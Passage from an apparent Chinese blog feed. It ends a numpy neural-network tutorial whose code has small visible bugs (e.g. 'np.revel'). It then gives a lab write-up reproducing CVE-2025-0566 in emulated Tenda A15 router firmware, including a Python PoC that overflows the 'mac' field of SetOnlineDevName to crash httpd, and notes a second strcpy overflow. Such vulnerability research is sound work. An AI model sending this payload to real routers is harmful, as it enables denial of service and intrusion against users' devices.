<span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">&quot;ReLU&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward_func</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> np.maximum(x, <span class="number">0.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward_func</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> x &gt; <span class="number">0.0</span></span><br></pre></td></tr></table></figure></div>

<h2 id="Net辅助网络更新的基类"><a href="#Net辅助网络更新的基类" class="headerlink" title="Net辅助网络更新的基类"></a>Net辅助网络更新的基类</h2><p>对于神经网络来说，误差要在整个模型中传播，即正向传播（Forward）和反向传播（Backward）。正向传播的实现只需要按顺序遍历所有层，每层计算的输出作为下一层的输入；反向传播则需要逆序遍历所有层，将每层的梯度作为下一层的输入。</p>
<p>所以这一部分的具体实现需要建立一个辅助网络更新的网络基类，其作用是对每一层进行<code>forward</code>和<code>backward</code>计算，并更新各个层的参数；</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, layers</span>):</span><br><span class="line">        <span class="variable language_">self</span>.layers = layers</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, inputs</span>):</span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="variable language_">self</span>.layers:</span><br><span class="line">            inputs = layer.forward(inputs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward</span>(<span class="params">self, grad</span>):</span><br><span class="line">        all_greds = []</span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="variable language_">self</span>.layers):</span><br><span class="line">            grad = layer.backward(grad)</span><br><span class="line">            all_greds.append(grad)</span><br><span class="line">        <span class="keyword">return</span> all_greds[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_params_and_grads</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="variable language_">self</span>.layers:</span><br><span class="line">            <span class="keyword">yield</span> layer.params, layer.grads</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_parameters</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span>  [layer.params <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="variable language_">self</span>.layers]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_parameters</span>(<span class="params">self, params</span>):</span><br><span class="line">        <span class="keyword">for</span> i, layer <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="variable language_">self</span>.layers):</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> layer.params.keys():</span><br><span class="line">                layer.params[key] = params[i]</span><br></pre></td></tr></table></figure></div>

<h2 id="损失函数与优化器"><a href="#损失函数与优化器" class="headerlink" title="损失函数与优化器"></a>损失函数与优化器</h2><p>根据前两篇文章也可以看出，对于神经网络的训练，损失函数的计算以及优化器的选择（参数优化）是必不可少的，首先是损失函数：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseLoss</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loss</span>(<span class="params">self, predicted, actual</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">grad</span>(<span class="params">self, predicted, actual</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br></pre></td></tr></table></figure></div>

<p>优化器的基类需要实现根据当前梯度，计算返回实际优化时每个参数改变的步长：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseOptimizer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, lr, weight_decay</span>):</span><br><span class="line">        <span class="variable language_">self</span>.lr = lr</span><br><span class="line">        <span class="variable language_">self</span>.weight_decay = weight_decay</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compute_step</span>(<span class="params">self, grads, params</span>):</span><br><span class="line">        step = <span class="built_in">list</span>()</span><br><span class="line">        flatten_grads = np.concatenate(</span><br><span class="line">            [np.revel(v) <span class="keyword">for</span> grad <span class="keyword">in</span> grads <span class="keyword">for</span> v <span class="keyword">in</span> grad.values()]</span><br><span class="line">        )</span><br><span class="line">        flatten_step = <span class="variable language_">self</span>._compute_step(flatten_grads)</span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">            layer = <span class="built_in">dict</span>()</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> param.items():</span><br><span class="line">                block = np.prod(v.shape)</span><br><span class="line">                _step = flatten_step[p:p+block].reshape(v.shape)</span><br><span class="line">                _step -= <span class="variable language_">self</span>.weight_decay * v</span><br><span class="line">                layer[k] = _step</span><br><span class="line">                p += block</span><br><span class="line">            step.append(layer)</span><br><span class="line">        <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_compute_step</span>(<span class="params">self, grads</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br></pre></td></tr></table></figure></div>

<p>对于损失函数的具体实现，常用多分类损失函数——多分类Softmax交叉熵，数学形式如下：<br>$$<br>cross(y_{true}, y_{pred}) &#x3D; -\sum_{i &#x3D; 1}^Ny(i)\times\log(y\ _pred(i))<br>$$<br>具体实现为：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CrossEntropyLoss</span>(<span class="title class_ inherited__">BaseLoss</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loss</span>(<span class="params">self, predicted, actual</span>):</span><br><span class="line">        m = predicted.shape[<span class="number">0</span>]</span><br><span class="line">        exps = np.exp(predicted - np.<span class="built_in">max</span>(predicted, axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>))</span><br><span class="line">        p = exps / np.<span class="built_in">sum</span>(exps, axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>)</span><br><span class="line">        nll = -np.log(np.<span class="built_in">sum</span>(p * actual, axis=<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> np.<span class="built_in">sum</span>(nll) / m</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">grad</span>(<span class="params">self, predicted, actual</span>):</span><br><span class="line">        m = predicted.shape[<span class="number">0</span>]</span><br><span class="line">        grad = np.copy(predicted)</span><br><span class="line">        grad -= actual</span><br><span class="line">        <span class="keyword">return</span> grad / m</span><br></pre></td></tr></table></figure></div>

<h2 id="整体model类实现"><a href="#整体model类实现" class="headerlink" title="整体model类实现"></a>整体model类实现</h2><p><code>Model</code>类实现了我们一开始设计的三个接口。在<code>forward</code>方法中，直接调用net的forward方法，在<code>backword</code>方法中，把net、loss、optimizer串联起来，先计算损失，然后反向传播得到梯度，由optimizer计算步长，最后通过apply_gard对参数进行更新：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Model</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, net, loss, optimizer</span>):</span><br><span class="line">        <span class="variable language_">self</span>.net = net</span><br><span class="line">        <span class="variable language_">self</span>.loss = loss</span><br><span class="line">        <span class="variable language_">self</span>.optimizer = optimizer</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, inputs</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.net.forward(inputs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward</span>(<span class="params">self, preds, targets</span>):</span><br><span class="line">        loss = <span class="variable language_">self</span>.loss.loss(preds, targets)</span><br><span class="line">        grad = <span class="variable language_">self</span>.loss.grad(preds, targets)</span><br><span class="line">        grads = <span class="variable language_">self</span>.net.backward(grad)</span><br><span class="line">        params = <span class="variable language_">self</span>.net.get.parameters()</span><br><span class="line">        step = <span class="variable language_">self</span>.optimizer.compute_step(grads, params)</span><br><span class="line">        <span class="keyword">return</span> loss, step</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">apply_grad</span>(<span class="params">self, grads</span>):</span><br><span class="line">        <span class="keyword">for</span> grad, (param, _) <span class="keyword">in</span> <span class="built_in">zip</span>(grads, <span class="variable language_">self</span>.net.get_params_and_grads()):</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> param.items():</span><br><span class="line">                param[k] += grad[k]</span><br></pre></td></tr></table></figure></div>

<h2 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_one_hot</span>(<span class="params">targets, nb_classes=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> np.eye(nb_classes)[np.array(targets).reshape(-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">train_x = np.load(<span class="string">&quot;../MNIST/mnist/mnist/x_train.npy&quot;</span>)</span><br><span class="line">train_x = np.reshape(train_x, [<span class="number">60000</span>, <span class="number">784</span>])</span><br><span class="line">train_y = get_one_hot(np.load(<span class="string">&quot;../MNIST/mnist/mnist/y_train_label.npy&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> layer, model, net, loss, optimizer</span><br><span class="line">net = net.Net([</span><br><span class="line">    layer.Dense(<span class="number">200</span>),</span><br><span class="line">    layer.ReLU(),</span><br><span class="line">    layer.Dense(<span class="number">100</span>),</span><br><span class="line">    layer.ReLU(),</span><br><span class="line">    layer.Dense(<span class="number">70</span>),</span><br><span class="line">    layer.ReLU(),</span><br><span class="line">    layer.Dense(<span class="number">30</span>),</span><br><span class="line">    layer.ReLU(),</span><br><span class="line">    layer.Dense(<span class="number">10</span>),</span><br><span class="line">])</span><br><span class="line">model = model.Model(net = net, loss = loss.SoftmaxCrossEntropy(), optimizer = optimizer.Adam(lr = <span class="number">2e-4</span>))</span><br><span class="line">loss_list = <span class="built_in">list</span>()</span><br><span class="line">train_num = <span class="number">60000</span> // <span class="number">128</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    train_loss = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(train_num):</span><br><span class="line">        start = i * <span class="number">128</span></span><br><span class="line">        end = (i + <span class="number">1</span>) * <span class="number">128</span></span><br><span class="line">        inputs = train_x[start:end]</span><br><span class="line">        targets = train_y[start:end]</span><br><span class="line">        pred = model.forward(inputs)</span><br><span class="line">        loss, grads = model.backward(pred, targets)</span><br><span class="line">        model.apply_grad(grads)</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">10</span> == <span class="number">0</span> :</span><br><span class="line">            test_pred = model.forward(inputs)</span><br><span class="line">            test_pred_idx = np.argmax(test_pred, axis=<span class="number">1</span>)</span><br><span class="line">            real_pred_idx = np.argmax(targets, axis=<span class="number">1</span>)</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> pre, rel <span class="keyword">in</span> <span class="built_in">zip</span>(test_pred_idx, real_pred_idx):</span><br><span class="line">                <span class="keyword">if</span> pre == rel:</span><br><span class="line">                    counter += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;train_loss: &quot;</span>, <span class="built_in">round</span>(loss, <span class="number">2</span>), <span class="string">&quot;accuracy: &quot;</span>, <span class="built_in">round</span>(counter / <span class="number">128</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>大模型开发</category>
        <category>PyTorch</category>
        <category>ChatGLM</category>
      </categories>
      <tags>
        <tag>大模型开发</tag>
        <tag>PyTorch</tag>
        <tag>ChatGLM</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2025-0566复现</title>
    <url>/posts/CVE-2025-0566%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h1><h2 id="固件地址"><a href="#固件地址" class="headerlink" title="固件地址"></a>固件地址</h2><p><a class="link"   href="https://www.tendacn.com/download/detail-3187.html" >固件下载地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="固件信息收集"><a href="#固件信息收集" class="headerlink" title="固件信息收集"></a>固件信息收集</h2><p>使用<code>binwalk</code>指令解压固件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me US_A15V1.0RTL_V15.13.07.13_multi_TD01.bin</span><br></pre></td></tr></table></figure></div>

<p>不加密的固件就是好固件</p>
<p>使用<code>firmwalker</code>进行信息收集，<code>firmwalker</code>安装：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/craigz28/firmwalker.git</span><br><span class="line">cd firmwalker/</span><br><span class="line">chmod +x firmwalker.sh</span><br></pre></td></tr></table></figure></div>

<p>使用：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh /home/iot/Desktop/Tenda/A15/CVE-2025-0566/_US_A15V1.0RTL_V15.13.07.13_multi_TD01.bin.extracted/squashfs-root/ &gt; /home/iot/Desktop/Tenda/A15/CVE-2025-0566/firmwalker_scan.txt</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324125007627.png"
                      alt="image-20250324125007627"
                ><figcaption>image-20250324125007627</figcaption></figure></p>
<p>web服务是<code>httpd</code>。</p>
<p>看下架构，直接用<code>checksec</code>好了，还可以顺便看到保护</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324125150235.png"
                      alt="image-20250324125150235"
                ><figcaption>image-20250324125150235</figcaption></figure></p>
<p><code>mips</code>32位小端序架构，啥保护都没开；</p>
<h1 id="分析启动项"><a href="#分析启动项" class="headerlink" title="分析启动项"></a>分析启动项</h1><p>梦回做ctf内核题</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324125501875.png"
                      alt="image-20250324125501875"
                ><figcaption>image-20250324125501875</figcaption></figure></p>
<p>这里拷贝了文件夹，可以手动创建以便，以防后面模拟的时候出问题；</p>
<p>这里要小心的是<code>/etc/</code>，我不小心把系统的给覆写了。。。。。。</p>
<h1 id="用户模拟"><a href="#用户模拟" class="headerlink" title="用户模拟"></a>用户模拟</h1><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/squashfs-root</span></span><br><span class="line"><span class="built_in">cp</span> (<span class="built_in">which</span> qemu-mipsel-static) qemu-mipsel-static</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chroot</span> . ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324135742677.png"
                      alt="image-20250324135742677"
                ><figcaption>image-20250324135742677</figcaption></figure></p>
<p>可以启动成功，但是<code>ip</code>配置错误了，需要用<code>IDA</code>进行分析了</p>
<h2 id="分析httpd"><a href="#分析httpd" class="headerlink" title="分析httpd"></a>分析httpd</h2><p>查找赋值ip的地方</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324140046267.png"
                      alt="image-20250324140046267"
                ><figcaption>image-20250324140046267</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324140133136.png"
                      alt="image-20250324140133136"
                ><figcaption>image-20250324140133136</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324140204634.png"
                      alt="image-20250324140204634"
                ><figcaption>image-20250324140204634</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324140249529.png"
                      alt="image-20250324140249529"
                ><figcaption>image-20250324140249529</figcaption></figure></p>
<p>找到<code>sin.addr</code>被赋值的地方，是该函数的参数，查找该函数的交叉引用，</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324140407253.png"
                      alt="image-20250324140407253"
                ><figcaption>image-20250324140407253</figcaption></figure></p>
<p>继续寻找</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324140511310.png"
                      alt="image-20250324140511310"
                ><figcaption>image-20250324140511310</figcaption></figure></p>
<p>发现是<code>br0</code>网卡的ip给了服务，所以创建一个<code>br0</code>的网卡</p>
<h2 id="创建br0"><a href="#创建br0" class="headerlink" title="创建br0"></a>创建br0</h2><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> brctl addbr br0</span><br><span class="line"><span class="built_in">sudo</span> ip addr add 192.168.0.1/24 dev br0</span><br><span class="line">ip -br -4 a</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324144817064.png"
                      alt="image-20250324144817064"
                ><figcaption>image-20250324144817064</figcaption></figure></p>
<p>接着就模拟成功了；</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324150246486.png"
                      alt="image-20250324150246486"
                ><figcaption>image-20250324150246486</figcaption></figure></p>
<h1 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h1><h2 id="主机网卡配置"><a href="#主机网卡配置" class="headerlink" title="主机网卡配置"></a>主机网卡配置</h2><p>创建<code>net.sh</code></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建名为 tap0 的虚拟网络接口</span></span><br><span class="line"><span class="built_in">sudo</span> tunctl -t tap0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 tap0 接口的 IP 地址和子网掩码</span></span><br><span class="line"><span class="built_in">sudo</span> ip addr add 192.168.0.4/24 dev tap0</span><br><span class="line"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> tap0 up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用 IP 转发</span></span><br><span class="line"><span class="built_in">echo</span> 1 | <span class="built_in">sudo</span> <span class="built_in">tee</span> /proc/sys/net/ipv4/ip_forward &gt; /dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 NAT (假设物理机外网接口是 ens33)</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 tap0 接口的数据包转发</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -A FORWARD -i tap0 -j ACCEPT</span><br><span class="line"><span class="built_in">sudo</span> iptables -A FORWARD -o tap0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tap0 接口创建和配置完成。&quot;</span></span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324150710479.png"
                      alt="image-20250324150710479"
                ><figcaption>image-20250324150710479</figcaption></figure></p>
<p>qemu启动脚本</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel /home/lxxxt/qemu-images/mipsel/vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">-hda /home/lxxxt/qemu-images/mipsel/debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span>  \</span><br><span class="line">-nographic \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./run.sh</span><br></pre></td></tr></table></figure></div>

<h2 id="mips虚拟机"><a href="#mips虚拟机" class="headerlink" title="mips虚拟机"></a>mips虚拟机</h2><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">ip <span class="built_in">link</span> add br0 <span class="built_in">type</span> dummy</span><br><span class="line">ifconfig eth0 192.168.0.5/24</span><br><span class="line">ifconfig br0 192.168.0.6/24</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324152207123.png"
                      alt="image-20250324152207123"
                ><figcaption>image-20250324152207123</figcaption></figure></p>
<h2 id="传文件"><a href="#传文件" class="headerlink" title="传文件"></a>传文件</h2><p>主机</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">tar -cvf squashfs-root.tar squashfs-root</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></div>

<p>qemu</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">wget http://192.168.0.4:8000/squashfs-root.tar</span><br><span class="line">tar -xvf squashfs-root.tar squashfs-root</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324153822759.png"
                      alt="image-20250324153822759"
                ><figcaption>image-20250324153822759</figcaption></figure></p>
<h2 id="启动httpd"><a href="#启动httpd" class="headerlink" title="启动httpd"></a>启动httpd</h2><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">./bin/httpd</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324153935538.png"
                      alt="image-20250324153935538"
                ><figcaption>image-20250324153935538</figcaption></figure></p>
<h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324154724547.png"
                      alt="image-20250324154724547"
                ><figcaption>image-20250324154724547</figcaption></figure></p>
<p>找到定义函数的位置；</p>
<p>根据作者文章说过：</p>
<blockquote>
<p><u>我们要重点关注<code>set</code> 类型的函数，因为大多数是需要接受前端数据，进行设置操作的，因此存在较高的安全风险。</u></p>
</blockquote>
<h2 id="formSetDeviceName函数"><a href="#formSetDeviceName函数" class="headerlink" title="formSetDeviceName函数"></a>formSetDeviceName函数</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324154909015.png"
                      alt="image-20250324154909015"
                ><figcaption>image-20250324154909015</figcaption></figure></p>
<p>该函数是用来处理<code>SetOnlineDevName</code>请求的；</p>
<p>是用来设置设备名称的，处理两个请求的参数<code>mac</code>和<code>devName</code>，然后利用<code>set_device_naem</code>函数处理</p>
<h2 id="set-device-name函数"><a href="#set-device-name函数" class="headerlink" title="set_device_name函数"></a>set_device_name函数</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324155301643.png"
                      alt="image-20250324155301643"
                ><figcaption>image-20250324155301643</figcaption></figure></p>
<p>这里将两个参数传给了sprintf，两个参数都没有长度限制；</p>
<p>接着尝试写POC</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ip = <span class="string">&#x27;192.168.0.6&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>/goform/SetOnlineDevName&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;mac&quot;</span>: <span class="string">&#x27;1e:ac:3e:99:9a:67&#x27;</span>*<span class="number">0x100</span>,</span><br><span class="line">    <span class="string">&quot;devName&quot;</span>: <span class="string">&#x27;devname1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = payload)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324161226263.png"
                      alt="image-20250324161226263"
                ><figcaption>image-20250324161226263</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324161235766.png"
                      alt="image-20250324161235766"
                ><figcaption>image-20250324161235766</figcaption></figure></p>
<p>发现程序没有崩溃，并且打印了<code>set device name error! </code>，导致这样的原因如下</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324161952974.png"
                      alt="image-20250324161952974"
                ><figcaption>image-20250324161952974</figcaption></figure></p>
<p>我么可以patch将他的逻辑直接跳过</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324163144571.png"
                      alt="image-20250324163144571"
                ><figcaption>image-20250324163144571</figcaption></figure></p>
<p>把那里nop掉就伪代码就成这样了；</p>
<p>可以使程序崩溃了</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324163108510.png"
                      alt="image-20250324163108510"
                ><figcaption>image-20250324163108510</figcaption></figure></p>
<p>根据这个找洞方式，我又在另一个set的函数找到了，还挺高兴的，但是原文作者在文章中也写了，无所谓，学习到一种方式即可；</p>
<p>另一个是分析处理<code>setBlackRule</code>请求的<code>formAddMacfilterRule</code>函数</p>
<h2 id="formAddMacfilterRule函数"><a href="#formAddMacfilterRule函数" class="headerlink" title="formAddMacfilterRule函数"></a>formAddMacfilterRule函数</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324163458621.png"
                      alt="image-20250324163458621"
                ><figcaption>image-20250324163458621</figcaption></figure></p>
<p>其实和上边处理逻辑是一样的，</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324163626713.png"
                      alt="image-20250324163626713"
                ><figcaption>image-20250324163626713</figcaption></figure></p>
<p>跟进发现传入的参数会作为<code>source_rule</code>拷贝给<code>dest_rule-&gt;name</code>，这是有strcpy造成的栈溢出，但是前面有一个是否包含<code>\r</code>的校验；</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
